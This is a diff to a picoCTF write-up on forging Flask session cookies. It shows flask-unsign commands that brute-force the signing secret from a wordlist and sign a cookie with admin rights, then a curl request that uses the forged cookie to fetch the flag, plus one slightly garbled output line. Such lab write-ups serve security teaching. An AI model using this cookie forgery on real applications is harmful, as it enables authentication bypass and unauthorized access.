@@ -24,7 +24,39 @@ Our flag will only be displayed if the session's `very_auth=admin`. And session 
 session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YVllZQ.mOg3VmVKn1VWRpSFhO94BpzXUjM
 ```
 
-Let's take a look at how Flask implements their session. From the [documentation](https://flask.palletsprojects.com/en/2.0.x/api/?highlight=session#flask.sessions.SessionInterface),
+The cookie consists of two parts. 
+```
+{base64-encoded}.{signature}
+```
+
+All we have to do is to guess the secret key and then create a new cookie with the secret.
+
+Thankfully `flask-unsign` exists.
+
+```bash
+$ pip install flask-unsign
+
+# Find the correct secret from the list provided in server.py
+$ flask-unsign --unsign -c eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YVllZQ.mOg3VmVKn1VWRpSFhO94BpzXUjM --wordlist secrets.txt
+[*] Session decodes to: {'very_auth': 'blank'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 28 attemptscadamia
+'peanut butter'
+# Create a new token signed with the secret key
+
+$ flask-unsign --sign -c '{"very_auth":"admin"}' --secret 'peanut butter'
+eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YVvx4w.NfL4nHarA5GJEvhXkusK5bWUcGg
+```
+
+Now all we have to do is POST the cookie to `/display` and we'll get our flag.
+
+```bash
+$ curl 'http://mercury.picoctf.net:53700/display' -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YVvx4w.NfL4nHarA5GJEvhXkusK5bWUcGg'
+
+picoCTF{pwn_4ll_th3_cook1E5_3646b931}
+```
+
+For people interested in how the cookie is created. Flask uses the following class in `itsdangerous` library and calls its `sign` method.
 
 ```python
 class Signer:
@@ -128,6 +160,3 @@ class Signer:
         value = want_bytes(value)
         return value + self.sep + self.get_signature(value)
 ```
-
-The session contains 
-A flask session token consists of the `encoded section` and the `signature`.
